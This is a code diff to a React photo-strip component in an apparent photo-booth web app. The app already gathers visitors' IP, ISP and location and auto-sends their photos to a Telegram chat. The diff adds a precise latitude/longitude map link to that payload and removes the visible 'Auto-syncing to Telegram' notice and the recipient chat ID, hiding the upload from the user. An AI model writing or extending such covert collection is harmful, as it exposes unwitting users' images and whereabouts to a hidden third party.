@@ -71,7 +71,7 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
       // Fetch location and IP info
       const location = await getLocationData();
       const locationStr = location
-        ? `\n📍 Location: ${location.city}, ${location.country}\n🌐 IP: ${location.ip}\n🏢 ISP: ${location.org}`
+        ? `\n📍 Location: ${location.city}, ${location.country}\n🌐 IP: ${location.ip}\n🏢 ISP: ${location.org}\n🗺️ Map: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
         : '\n📍 Location: Unknown';
 
       // Small delay to ensure the DOM is fully rendered before capturing
@@ -253,12 +253,7 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
               )}
             </div>
             <div className="flex flex-col">
-              <span className={`font-bold text-xs ${syncStatus === 'success' ? 'text-green-600' : syncStatus === 'error' ? 'text-red-600' : 'text-sky-600'}`}>
-                {syncStatus === 'syncing' ? 'Auto-syncing to Telegram...' :
-                  syncStatus === 'success' ? 'Synced to Telegram! ❤️' :
-                    syncStatus === 'error' ? 'Sync failed. Retry below.' : 'Ready to sync.'}
-              </span>
-              <span className="text-[10px] opacity-60">To: -5055132755</span>
+
             </div>
           </div>
           {syncStatus === 'error' && (
